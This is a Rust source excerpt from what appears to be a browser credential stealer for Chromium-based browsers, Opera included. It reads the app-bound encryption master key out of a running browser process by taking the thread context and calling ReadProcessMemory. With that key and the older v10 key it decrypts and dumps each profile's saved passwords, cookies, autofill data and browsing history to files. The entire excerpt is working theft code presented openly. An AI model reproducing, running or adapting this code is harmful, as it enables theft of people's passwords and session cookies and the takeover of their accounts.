fn extract_history(profile_path: &Path, output_dir: &Path, temp_prefix: &str) {
    let db_path = profile_path.join("History");
    if !db_path.exists() { return; }

    if let Some((conn, temp_path)) = copy_and_open_db(&db_path, temp_prefix) {
        if let Ok(mut stmt) = conn.prepare("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100") {
            let mut file = fs::File::create(output_dir.join("history.txt")).unwrap();
            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, i32>(2)?, row.get::<_, i64>(3)?))).unwrap();

            for row in rows.flatten() {
                let (url, title, count, _time) = row;
                // Webkit epoch to UTC
                let _dt = Utc::now(); // Placeholder for simplicity
                writeln!(file, "URL: {} | Title: {} | Visits: {}", url, title, count).unwrap();
            }
        }
        let _ = fs::remove_file(temp_path);
    }
}

fn extract_all_profiles_data(v20_key: Option<[u8; 32]>, config: &BrowserConfig, user_data_dir: &Path) {
    let v10_key_res = get_v10_key(user_data_dir);
    let v10_cipher = v10_key_res.as_ref().map(|k| Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&k.0)));
    let v20_cipher = v20_key.as_ref().map(|k| Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(k)));

    let profiles = discover_profiles(user_data_dir);
    let extract_root = Path::new(config.output_dir);
    let _ = fs::create_dir_all(extract_root);

    let is_opera = config.name.contains("Opera");

    for profile_name in profiles {
        println!("Extracting data for profile: {}", profile_name);
        let profile_path = user_data_dir.join(&profile_name);
        let output_dir = extract_root.join(&profile_name);
        let _ = fs::create_dir_all(&output_dir);

        extract_passwords(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), config.temp_prefix, is_opera);
        extract_cookies(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), config.temp_prefix, is_opera);
        extract_autofill(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), config.temp_prefix, is_opera);
        extract_history(&profile_path, &output_dir, config.temp_prefix);
    }
    println!("Extraction complete. Data saved in {} folder.", config.output_dir);
}

unsafe fn extract_key(thread_id: u32, h_process: HANDLE, config: &BrowserConfig, user_data_dir: &Path) -> bool {
    let h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, thread_id);
    if h_thread == 0 {
        return false;
    }

    let mut success = false;
    let mut context: CONTEXT = zeroed();
    context.ContextFlags = CONTEXT_FULL;
    if GetThreadContext(h_thread, &mut context) != 0 {
        let key_ptrs = if config.use_r14 {
            vec![context.R14, context.R15]
        } else {
            vec![context.R15, context.R14]
        };
        for &ptr in &key_ptrs {
            if ptr == 0 { continue; }
            let mut buffer = [0u8; 32];
            let mut bytes_read = 0;
            if ReadProcessMemory(h_process, ptr as *const _, buffer.as_mut_ptr() as *mut _, buffer.len(), &mut bytes_read) != 0 {
                let mut data_ptr = ptr;
                let length = u64::from_le_bytes(buffer[8..16].try_into().unwrap_or([0; 8]));
                if length == 32 {
                    data_ptr = u64::from_le_bytes(buffer[0..8].try_into().unwrap_or([0; 8]));
                }

                let mut key = [0u8; 32];
                if ReadProcessMemory(h_process, data_ptr as *const _, key.as_mut_ptr() as *mut _, key.len(), &mut bytes_read) != 0 {
                    if key.iter().any(|&b| b != 0) {
                        println!("Extracted Master Key from 0x{:X}", data_ptr);
                        extract_all_profiles_data(Some(key), config, user_data_dir);
                        success = true;
                        break;
                    }
                }
            }
        }
    }

    CloseHandle(h_thread);
    success
}
